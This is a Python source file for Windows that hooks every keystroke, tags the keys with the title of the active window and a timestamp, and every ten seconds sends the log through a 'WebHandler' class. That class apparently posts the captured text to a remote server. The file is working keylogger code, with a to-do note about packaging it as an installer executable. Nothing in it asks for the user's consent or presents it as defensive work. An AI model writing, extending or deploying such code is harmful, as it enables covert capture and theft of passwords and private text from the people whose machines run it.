#

# TODO: make installer exe

import keyboard
import time
from ctypes import windll, create_unicode_buffer
from helpers.communicator import WebHandler


def get_time():
    return time.strftime('%R:%S')


TIMEOUT = 10  # seconds


class Tracker:
    current_window = None

    def __init__(self):
        self.output_handler = WebHandler()
        keyboard.hook(self.callback)
        while True:
            time.sleep(TIMEOUT)
            self.output_handler.write(flush=True)

    @staticmethod
    def get_foreground_window_title():
        # TODO: extend this script for other OS'es
        #  (with root access only unfortunately or find another way than 'keyboard')

        # todo: move to seperate file, like open_windows

        h_wnd = windll.user32.GetForegroundWindow()
        length = windll.user32.GetWindowTextLengthW(h_wnd)
        buf = create_unicode_buffer(length + 1)
        windll.user32.GetWindowTextW(h_wnd, buf, length + 1)

        return buf.value

    def set_foreground_window_title(self):
        new = self.get_foreground_window_title()
        if self.current_window != new:
            self.output_handler.write(f"\n\n=== {get_time()}: {new} ===")
            self.current_window = new

    def callback(self, event):
        if event.event_type == 'down':
            self.set_foreground_window_title()
            inp = event.name

            if inp == 'space':
                inp = ' '
            elif inp == 'enter':
                inp = '\n'
            elif len(inp) > 1:
                # not just a character, but something special like ctrl
                inp = f'\\{inp}\\'

            # flush on newline
            self.output_handler.write(inp)


def main():
    Tracker()


if __name__ == '__main__':
    main()

"""
Why tf dit it crash? I do not understand :C
"""
